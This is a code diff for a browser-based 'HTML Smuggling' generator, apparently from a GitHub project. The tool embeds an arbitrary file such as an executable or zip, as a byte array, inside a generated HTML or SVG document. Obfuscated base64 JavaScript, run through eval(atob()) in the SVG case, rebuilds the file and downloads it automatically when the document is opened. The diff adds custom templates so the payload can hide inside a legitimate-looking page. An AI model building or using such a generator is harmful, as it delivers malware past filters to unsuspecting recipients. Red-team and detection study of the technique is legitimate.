@@ -8,12 +8,28 @@
 </head>
 
 <body>
+    <a href="https://github.com/knightyun/html-smuggling" style="
+        position: absolute;
+        top: 30px;
+        right: -40px;
+        padding: 5px 50px;
+        background: lightgray;
+        transform: rotate(45deg);
+        box-shadow: 0 0 5px 0px #333;
+    " target="_blank">
+        <img alt="GitHub" src="https://img.shields.io/github/license/knightyun/html-smuggling">
+    </a>
+
     <fieldset>
         <legend><b>HTML Smuggling</b></legend>
         <form id="html-smuggle" onsubmit="return genHtml(this)">
             <p>
                 Select the file to embed (exe, zip etc.):
                 <input type="file" name="file" />
+            </p>
+            <p>
+                Select the html template file ( .html ):
+                <input type="file" name="html" />
             </p>
             <p>
                 <input type="submit" value="Generate HTML file" />
@@ -32,6 +48,10 @@
                 <input type="file" name="file" />
             </p>
             <p>
+                Select the svg template file ( .svg ):
+                <input type="file" name="svg" />
+            </p>
+            <p>
                 <input type="submit" value="Generate SVG file" />
             </p>
         </form>
@@ -48,70 +68,64 @@
             document.body.removeChild(a);
         }
 
-        function getHtmlString(arrStr, name, type) {
-            const jsStr = `function download(url, name) {
-    const a = document.createElement('a');
-    a.style.display = 'none';
-    a.href = url;
-    a.download = name;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-}
+        function getHtmlString(arrStr, name, type, template) {
+            const jsStr = `
+            function download(url, name) {
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                a.download = name;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
 
-document.addEventListener('DOMContentLoaded', function () {
-    var arrStr = '${arrStr}';
-    var name = '${name}';
-    var type = '${type}';
+            document.addEventListener('DOMContentLoaded', function () {
+                var arrStr = '${arrStr}';
+                var name = '${name}';
+                var type = '${type}';
 
-    var arr = arrStr.split(',').map(function (i) { return parseInt(i) });
-    var file = new File([new Uint8Array(arr).buffer], name, {
-        type: type,
-    });
+                var arr = arrStr.split(',').map(function (i) { return parseInt(i) });
+                var file = new File([new Uint8Array(arr).buffer], name, {
+                    type: type,
+                });
 
-    var url = URL.createObjectURL(file);
-    download(url, name);
-    URL.revokeObjectURL(url);
-});`;
+                var url = URL.createObjectURL(file);
+                download(url, name);
+                URL.revokeObjectURL(url);
+            });`;
 
-            return `<!DOCTYPE html>
-<html>
+            const html = new DOMParser().parseFromString(template, 'text/html');
+            const s = document.createElement('script');
+            s.src = `data:application/javascript;base64,${btoa(jsStr)}`;
+            html.body.appendChild(s);
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test</title>
-</head>
-
-<body>
-    <h1>Test</h1>
-
-    <script src="data:application/javascript;base64,${btoa(jsStr)}"><\/script>
-</body>
-
-</html>`;
+            return html.documentElement.outerHTML;
         }
 
-        function getSvgString(arrStr, name, type) {
-            const jsStr = `var arrStr = '${arrStr}';
-var name = '${name}';
-var type = '${type}';
+        function getSvgString(arrStr, name, type, template) {
+            const jsStr = `
+            var arrStr = '${arrStr}';
+            var name = '${name}';
+            var type = '${type}';
 
-var arr = arrStr.split(',').map(function (i) { return parseInt(i) });
-var file = new File([new Uint8Array(arr).buffer], name, {
-    type: type,
-});
+            var arr = arrStr.split(',').map(function (i) { return parseInt(i) });
+            var file = new File([new Uint8Array(arr).buffer], name, {
+                type: type,
+            });
 
-var url = URL.createObjectURL(file);
-location.href = url;
-URL.revokeObjectURL(url);`;
+            var url = URL.createObjectURL(file);
+            location.href = url;
+            URL.revokeObjectURL(url);`;
 
-            return `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
-    <rect width="100%" height="100%" fill="blue" />
+            const svg = new DOMParser().parseFromString(template, "text/xml");
+            const s = svg.createElement('script');
+            svg.documentElement.appendChild(s);
+            s.outerHTML = `<script type="text/javascript"><![CDATA[eval(atob("${btoa(jsStr)}"));]]><\/script>`;
 
-    <script type="text/javascript"><![CDATA[eval(atob("${btoa(jsStr)}"));]]><\/script>
-</svg>`;
+            return svg.documentElement.outerHTML;
         }
+
 
         function genHtml(form) {
             const formData = new FormData(form);
@@ -120,17 +134,24 @@ URL.revokeObjectURL(url);`;
             const file = formData.get('file');
             const name = file.name;
             const type = file.type;
+            /** @type {File} */
+            const htmlTemplate = formData.get('html');
 
             if (!name) {
                 alert('Please upload file first !');
                 return;
+            } else if (!htmlTemplate.name) {
+                alert('Please upload html template !');
+                return;
             }
 
-            file.arrayBuffer().then((data) => {
-                const arrStr = new Uint8Array(data).toString();
-                const html = getHtmlString(arrStr, name, type);
+            htmlTemplate.text().then(template => {
+                file.arrayBuffer().then((data) => {
+                    const arrStr = new Uint8Array(data).toString();
+                    const html = getHtmlString(arrStr, name, type, template);
 
-                download(`data:text/html;base64,${btoa(html)}`, 'html.html');
+                    download(`data:text/html;base64,${btoa(html)}`, 'html.html');
+                });
             });
 
             return false;
@@ -143,17 +164,24 @@ URL.revokeObjectURL(url);`;
             const file = formData.get('file');
             const name = file.name;
             const type = file.type;
+            /** @type {File} */
+            const svgTemplate = formData.get('svg');
 
             if (!name) {
                 alert('Please upload file first !');
                 return;
+            } else if (!svgTemplate.name) {
+                alert('Please upload svg template !');
+                return;
             }
 
-            file.arrayBuffer().then((data) => {
-                const arrStr = new Uint8Array(data).toString();
-                const svg = getSvgString(arrStr, name, type);
+            svgTemplate.text().then(template => {
+                file.arrayBuffer().then((data) => {
+                    const arrStr = new Uint8Array(data).toString();
+                    const svg = getSvgString(arrStr, name, type, template);
 
-                download(`data:image/svg+xml;base64,${btoa(svg)}`, 'svg.svg', type);
+                    download(`data:image/svg+xml;base64,${btoa(svg)}`, 'svg.svg', type);
+                });
             });
 
             return false;
